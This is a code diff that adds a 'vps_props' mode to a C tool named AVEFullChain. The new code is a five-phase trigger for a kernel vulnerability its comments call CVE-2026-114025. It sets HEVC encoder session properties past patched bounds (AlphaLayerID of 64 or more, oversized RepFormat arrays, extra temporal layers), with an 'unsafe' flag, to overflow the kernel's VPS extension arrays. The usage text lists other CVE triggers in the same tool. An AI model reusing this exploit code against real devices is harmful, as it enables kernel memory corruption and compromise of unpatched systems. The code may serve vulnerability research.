@@ -5307,6 +5307,474 @@ cleanup_dummies:
             CFRelease(session);
         }
 
+    } else if (strcmp(mode, "vps_props") == 0) {
+        /*
+         * vps_props — CVE-2026-114025 trigger via VPS extension properties
+         *
+         * The 27.2 patch (AVE_HEVC_CheckVPSExtBounds) adds bounds checks on:
+         *   vps_num_rep_formats_minus1 < 2
+         *   vps_max_layer_id < 63
+         *   vps_num_layer_sets_minus1 < 16
+         *   num_add_layer_sets <= 64
+         *   vps_max_sub_layers_minus1 < 7
+         *   vps_num_hrd_parameters <= 16
+         *
+         * These VPS fields are populated by PSGen based on session properties.
+         * CVE-2026-112705 proved that VT properties pass unchecked to kernel.
+         *
+         * This test sets VPS-influencing properties to values that exceed the
+         * bounds added in 27.2, then encodes to trigger PSGen VPS generation.
+         *
+         * Phase 1: Enumerate which VPS properties are accepted
+         * Phase 2: Set RepFormat arrays with >2 entries
+         * Phase 3: Set AlphaLayerID >= 63
+         * Phase 4: Combine MV-HEVC layers + alpha + temporal layers
+         * Phase 5: HEVC-with-alpha codec type (separate VPS layer path)
+         */
+        int phase = (argc > 2) ? atoi(argv[2]) : 0;
+        int unsafe = (argc > 3 && strcmp(argv[3], "unsafe") == 0);
+
+        rlog("=== VPS_PROPS: CVE-2026-114025 VPS property trigger ===\n");
+        rlog("Phase: %d, Unsafe: %d\n\n", phase, unsafe);
+
+        int w = 1280, h = 720;
+
+        if (phase == 0 || phase == 1) {
+            rlog("--- Phase 1: Property acceptance scan ---\n");
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            rlog("Session create: %d\n", (int)st);
+            if (st != noErr || !s) goto vps_props_done;
+
+            /* Test RequiredHEVC VPS properties */
+            const char *vps_props[] = {
+                "RequiredHEVCVideoParameterSetAlphaLayerID",
+                "RequiredHEVCSequenceParameterSetRepFormatIndex",
+                "RequiredHEVCSequenceParameterSetID",
+                "RequiredHEVCPictureParameterSetID",
+                "UserParameterSetsIds",
+                "EncodesAlpha",
+                "EncodesDepth",
+                "EncodesDisparity",
+                "TemporalIDNestingFlag",
+                "NumberOfTemporalLayers",
+                "NumOfTemporalLayer",
+            };
+            int n_props = sizeof(vps_props) / sizeof(vps_props[0]);
+
+            for (int i = 0; i < n_props; i++) {
+                /* Test with value 0 */
+                int val0 = 0;
+                CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &val0);
+                OSStatus sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
+                    vps_props[i], kCFStringEncodingUTF8), n0);
+                CFRelease(n0);
+                rlog("  %s = 0: %d\n", vps_props[i], (int)sp);
+
+                /* Test with value 1 */
+                int val1 = 1;
+                CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &val1);
+                sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
+                    vps_props[i], kCFStringEncodingUTF8), n1);
+                CFRelease(n1);
+                rlog("  %s = 1: %d\n", vps_props[i], (int)sp);
+
+                /* Test with value 64 (past bounds) */
+                int val64 = 64;
+                CFNumberRef n64 = CFNumberCreate(NULL, kCFNumberIntType, &val64);
+                sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
+                    vps_props[i], kCFStringEncodingUTF8), n64);
+                CFRelease(n64);
+                rlog("  %s = 64: %d\n", vps_props[i], (int)sp);
+            }
+
+            /* Test array properties */
+            rlog("\n  --- Array properties ---\n");
+            const char *arr_props[] = {
+                "RequiredHEVCVideoParameterSetRepFormatBitDepths",
+                "RequiredHEVCVideoParameterSetRepFormatChromaFormatIdcs",
+                "HEVCAuxiliaryLayerIDs",
+                "HEVCAuxiliaryIDs",
+                "RequiredMVHEVCVideoParameterSetAlphaVideoLayerIDs",
+                "RequiredMVHEVCSequenceParameterSetIDs",
+                "RequiredMVHEVCPictureParameterSetIDs",
+                "MVHEVCVideoLayerIDs",
+                "MVHEVCViewIDs",
+            };
+            int n_arr = sizeof(arr_props) / sizeof(arr_props[0]);
+
+            for (int i = 0; i < n_arr; i++) {
+                /* Test with 2-element array [8, 10] */
+                int vals2[] = {8, 10};
+                CFNumberRef nums2[2];
+                for (int j = 0; j < 2; j++)
+                    nums2[j] = CFNumberCreate(NULL, kCFNumberIntType, &vals2[j]);
+                CFArrayRef a2 = CFArrayCreate(NULL, (const void **)nums2, 2,
+                    &kCFTypeArrayCallBacks);
+                OSStatus sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
+                    arr_props[i], kCFStringEncodingUTF8), a2);
+                CFRelease(a2);
+                for (int j = 0; j < 2; j++) CFRelease(nums2[j]);
+                rlog("  %s [2]: %d\n", arr_props[i], (int)sp);
+
+                /* Test with 4-element array (exceeds rep_formats bound of 2) */
+                int vals4[] = {8, 10, 12, 8};
+                CFNumberRef nums4[4];
+                for (int j = 0; j < 4; j++)
+                    nums4[j] = CFNumberCreate(NULL, kCFNumberIntType, &vals4[j]);
+                CFArrayRef a4 = CFArrayCreate(NULL, (const void **)nums4, 4,
+                    &kCFTypeArrayCallBacks);
+                sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
+                    arr_props[i], kCFStringEncodingUTF8), a4);
+                CFRelease(a4);
+                for (int j = 0; j < 4; j++) CFRelease(nums4[j]);
+                rlog("  %s [4]: %d\n", arr_props[i], (int)sp);
+
+                /* Test with 8-element array */
+                int vals8[] = {0, 1, 2, 3, 4, 5, 6, 7};
+                CFNumberRef nums8[8];
+                for (int j = 0; j < 8; j++)
+                    nums8[j] = CFNumberCreate(NULL, kCFNumberIntType, &vals8[j]);
+                CFArrayRef a8 = CFArrayCreate(NULL, (const void **)nums8, 8,
+                    &kCFTypeArrayCallBacks);
+                sp = VTSessionSetProperty(s, CFStringCreateWithCString(NULL,
+                    arr_props[i], kCFStringEncodingUTF8), a8);
+                CFRelease(a8);
+                for (int j = 0; j < 8; j++) CFRelease(nums8[j]);
+                rlog("  %s [8]: %d\n", arr_props[i], (int)sp);
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+        if (phase == 0 || phase == 2) {
+            rlog("\n--- Phase 2: RepFormat array overflow (>2 entries) ---\n");
+            rlog("27.2 check: vps_num_rep_formats_minus1 < 2\n");
+
+            int rep_counts[] = {1, 2, 3, 4, 8, 16};
+            int n_rep = sizeof(rep_counts) / sizeof(rep_counts[0]);
+
+            for (int r = 0; r < n_rep; r++) {
+                int nrep = rep_counts[r];
+                rlog("  rep_formats=%d: ", nrep);
+
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+                CFRelease(enc_spec);
+                if (st != noErr || !s) {
+                    rlog("session fail\n");
+                    continue;
+                }
+
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+
+                /* Set RepFormatBitDepths array with nrep entries */
+                CFNumberRef *repnums = calloc(nrep, sizeof(CFNumberRef));
+                const void **repptrs = calloc(nrep, sizeof(void *));
+                for (int j = 0; j < nrep; j++) {
+                    int bd = 8 + (j % 3) * 2;
+                    repnums[j] = CFNumberCreate(NULL, kCFNumberIntType, &bd);
+                    repptrs[j] = repnums[j];
+                }
+                CFArrayRef reparr = CFArrayCreate(NULL, repptrs, nrep,
+                    &kCFTypeArrayCallBacks);
+                OSStatus sp = VTSessionSetProperty(s,
+                    CFSTR("RequiredHEVCVideoParameterSetRepFormatBitDepths"), reparr);
+                CFRelease(reparr);
+                for (int j = 0; j < nrep; j++) CFRelease(repnums[j]);
+                free(repnums); free(repptrs);
+                rlog("set=%d, ", (int)sp);
+
+                /* Prepare and encode */
+                st = VTCompressionSessionPrepareToEncodeFrames(s);
+                rlog("prepare=%d", (int)st);
+
+                if (st == noErr) {
+                    g_encode_done = 0;
+                    encode_one(s, 0, w, h);
+                    for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
+                    rlog(", encode=%d, psets=%zu", (int)g_cb_status, g_last_pset_count);
+                }
+                rlog("\n");
+
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+            }
+        }
+
+        if (phase == 0 || phase == 3) {
+            rlog("\n--- Phase 3: AlphaLayerID >= 63 ---\n");
+            rlog("27.2 check: vps_max_layer_id < 63\n");
+
+            int alpha_ids[] = {0, 1, 32, 62, 63, 64, 127, 255};
+            int n_alpha = sizeof(alpha_ids) / sizeof(alpha_ids[0]);
+
+            for (int a = 0; a < n_alpha; a++) {
+                int aid = alpha_ids[a];
+                rlog("  AlphaLayerID=%d: ", aid);
+
+                VTCompressionSessionRef s = NULL;
+                CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+                OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                    kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+                CFRelease(enc_spec);
+                if (st != noErr || !s) {
+                    rlog("session fail\n");
+                    continue;
+                }
+
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+
+                /* Enable alpha encoding */
+                VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+
+                /* Set AlphaLayerID */
+                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+                OSStatus sp = VTSessionSetProperty(s,
+                    CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+                CFRelease(aidn);
+                rlog("set=%d, ", (int)sp);
+
+                /* Prepare and encode */
+                st = VTCompressionSessionPrepareToEncodeFrames(s);
+                rlog("prepare=%d", (int)st);
+
+                if (st == noErr) {
+                    g_encode_done = 0;
+                    encode_one(s, 0, w, h);
+                    for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
+                    rlog(", encode=%d, psets=%zu", (int)g_cb_status, g_last_pset_count);
+                }
+                rlog("\n");
+
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+            }
+        }
+
+        if (phase == 0 || phase == 4) {
+            rlog("\n--- Phase 4: Combined MV-HEVC + Alpha + Temporal ---\n");
+            rlog("Goal: maximize VPS extension field values simultaneously\n");
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            rlog("Session create: %d\n", (int)st);
+            if (st != noErr || !s) goto vps_props_done;
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+
+            /* MV-HEVC layer IDs [0, 1] */
+            int layers[] = {0, 1};
+            CFNumberRef ln[2];
+            ln[0] = CFNumberCreate(NULL, kCFNumberIntType, &layers[0]);
+            ln[1] = CFNumberCreate(NULL, kCFNumberIntType, &layers[1]);
+            CFArrayRef la = CFArrayCreate(NULL, (const void **)ln, 2, &kCFTypeArrayCallBacks);
+            OSStatus sp1 = VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, la);
+            rlog("MVHEVCVideoLayerIDs [0,1]: %d\n", (int)sp1);
+            OSStatus sp2 = VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_MVHEVCViewIDs, la);
+            rlog("MVHEVCViewIDs [0,1]: %d\n", (int)sp2);
+            CFRelease(la); CFRelease(ln[0]); CFRelease(ln[1]);
+
+            /* Stereo eye views */
+            VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
+            VTSessionSetProperty(s,
+                kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
+
+            /* Enable alpha */
+            OSStatus sp3 = VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+            rlog("EncodesAlpha: %d\n", (int)sp3);
+
+            /* Set high AlphaLayerID (past vps_max_layer_id < 63 bound) */
+            int aid = unsafe ? 64 : 2;
+            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+            OSStatus sp4 = VTSessionSetProperty(s,
+                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+            CFRelease(aidn);
+            rlog("RequiredHEVCVideoParameterSetAlphaLayerID=%d: %d\n", aid, (int)sp4);
+
+            /* Set 4 RepFormat entries (past vps_num_rep_formats_minus1 < 2) */
+            int bds[] = {8, 10, 12, 8};
+            CFNumberRef bdnums[4];
+            for (int j = 0; j < 4; j++)
+                bdnums[j] = CFNumberCreate(NULL, kCFNumberIntType, &bds[j]);
+            CFArrayRef bdarr = CFArrayCreate(NULL, (const void **)bdnums, 4,
+                &kCFTypeArrayCallBacks);
+            OSStatus sp5 = VTSessionSetProperty(s,
+                CFSTR("RequiredHEVCVideoParameterSetRepFormatBitDepths"), bdarr);
+            CFRelease(bdarr);
+            for (int j = 0; j < 4; j++) CFRelease(bdnums[j]);
+            rlog("RepFormatBitDepths [4 entries]: %d\n", (int)sp5);
+
+            /* Set temporal layers (contributes to vps_max_sub_layers_minus1) */
+            int ntl = unsafe ? 16 : 4;
+            CFNumberRef ntn = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+            OSStatus sp6 = VTSessionSetProperty(s,
+                CFSTR("NumberOfTemporalLayers"), ntn);
+            CFRelease(ntn);
+            rlog("NumberOfTemporalLayers=%d: %d\n", ntl, (int)sp6);
+
+            /* HEVCAuxiliaryLayerIDs (adds to num_add_layer_sets) */
+            int auxids[] = {0, 1, 2, 3};
+            CFNumberRef auxnums[4];
+            for (int j = 0; j < 4; j++)
+                auxnums[j] = CFNumberCreate(NULL, kCFNumberIntType, &auxids[j]);
+            CFArrayRef auxarr = CFArrayCreate(NULL, (const void **)auxnums, 4,
+                &kCFTypeArrayCallBacks);
+            OSStatus sp7 = VTSessionSetProperty(s,
+                CFSTR("HEVCAuxiliaryLayerIDs"), auxarr);
+            CFRelease(auxarr);
+            for (int j = 0; j < 4; j++) CFRelease(auxnums[j]);
+            rlog("HEVCAuxiliaryLayerIDs [4 entries]: %d\n", (int)sp7);
+
+            /* Prepare — triggers sAddClient which populates sHEVC_VPS */
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            rlog("PrepareToEncodeFrames: %d\n", (int)st);
+
+            if (st == noErr) {
+                g_encode_done = 0;
+                g_cb_status = -999;
+                g_last_pset_count = 0;
+                g_last_pset_total_bytes = 0;
+
+                encode_one(s, 0, w, h);
+                for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
+                rlog("Encode: status=%d, psets=%zu, bytes=%zu\n",
+                    (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
+
+                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+        if (phase == 0 || phase == 5) {
+            rlog("\n--- Phase 5: HEVC-with-alpha codec type ---\n");
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+            /* Use HEVC-with-alpha codec type (muxa) */
+            OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+                (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
+                encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            rlog("HEVC-with-Alpha session: %d\n", (int)st);
+
+            if (st == noErr && s) {
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+
+                /* Set alpha quality */
+                float aq = 0.75f;
+                CFNumberRef aqn = CFNumberCreate(NULL, kCFNumberFloat32Type, &aq);
+                OSStatus sp = VTSessionSetProperty(s,
+                    CFSTR("TargetQualityForAlpha"), aqn);
+                CFRelease(aqn);
+                rlog("TargetQualityForAlpha: %d\n", (int)sp);
+
+                /* AlphaChannelMode */
+                sp = VTSessionSetProperty(s,
+                    CFSTR("AlphaChannelMode"), CFSTR("PremultipliedAlpha"));
+                rlog("AlphaChannelMode: %d\n", (int)sp);
+
+                /* High AlphaLayerID */
+                int aid = unsafe ? 64 : 1;
+                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+                sp = VTSessionSetProperty(s,
+                    CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+                CFRelease(aidn);
+                rlog("AlphaLayerID=%d: %d\n", aid, (int)sp);
+
+                st = VTCompressionSessionPrepareToEncodeFrames(s);
+                rlog("PrepareToEncodeFrames: %d\n", (int)st);
+
+                if (st == noErr) {
+                    g_encode_done = 0;
+                    /* Need BGRA pixel buffer for alpha */
+                    CVPixelBufferRef pb = NULL;
+                    NSDictionary *pbattrs = NULL;
+                    CFMutableDictionaryRef pbdict = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(pbdict, kCVPixelBufferIOSurfacePropertiesKey,
+                        CFDictionaryCreate(NULL, NULL, NULL, 0,
+                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks));
+
+                    CVReturn cvr = CVPixelBufferCreate(NULL, w, h,
+                        kCVPixelFormatType_32BGRA, pbdict, &pb);
+                    CFRelease(pbdict);
+                    rlog("BGRA PixelBuffer: %d\n", (int)cvr);
+
+                    if (cvr == 0 && pb) {
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        void *base = CVPixelBufferGetBaseAddress(pb);
+                        if (base) memset(base, 0x80, CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+
+                        CMTime pts = CMTimeMake(0, 30);
+                        CMTime dur = CMTimeMake(1, 30);
+                        st = VTCompressionSessionEncodeFrame(s, pb, pts, dur,
+                            NULL, NULL, NULL);
+                        rlog("EncodeFrame (BGRA alpha): %d\n", (int)st);
+
+                        for (int ww = 0; ww < 500 && !g_encode_done; ww++) usleep(10000);
+                        rlog("Callback: status=%d, psets=%zu, bytes=%zu\n",
+                            (int)g_cb_status, g_last_pset_count, g_last_pset_total_bytes);
+
+                        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+                        CVPixelBufferRelease(pb);
+                    }
+                }
+
+                VTCompressionSessionInvalidate(s);
+                CFRelease(s);
+            }
+        }
+
+vps_props_done:
+        rlog("\n=== VPS_PROPS complete ===\n");
+        rlog("Properties accepted by VT but NOT validated in kernel (27.1) will\n");
+        rlog("overflow sHEVC_VPS extension arrays during sAddClient.\n");
+        rlog("Compare which properties report set=0 (accepted) above.\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -5349,6 +5817,7 @@ cleanup_dummies:
         rlog("  transcode_vps      -- KEY: Decode crafted VPS then re-encode (transcode path)\n");
         rlog("  vps_verify         -- Verify if crafted VPS reaches kernel (compare output)\n");
         rlog("  xpc_vps [phase]    -- XPC VPS field manipulation + crafted format injection\n");
+        rlog("  vps_props [phase] [unsafe] -- KEY: CVE-114025 VPS property trigger (5 phases)\n");
         rlog("  mctf_oob [max]     -- KEY: CVE-112468/112469 MCTF OOB via encode properties\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
